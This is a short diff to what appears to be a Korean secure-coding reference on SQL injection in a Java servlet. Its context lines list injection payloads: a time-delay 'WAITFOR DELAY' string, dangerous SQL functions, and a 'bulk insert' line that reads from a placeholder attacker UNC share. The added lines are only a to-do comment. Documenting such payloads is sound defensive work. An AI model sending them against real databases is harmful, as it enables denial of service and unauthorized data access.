@@ -248,3 +248,5 @@ public class SqlInjectionSample extends HttpServlet
 |WAITFOR DELAY '0:0:10'-- |시스템 자원 소모 유도 |
 |MD5(), SHA1(), PASSWORD(), ENCODE(), COMPRESS(), ROW_COUNT(), SCHEMA(), VERSION() |위험한 함수 사용|
 |bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'|Windows UNC Share를 악용|
+
+# C code 추가해야함...~!!!!
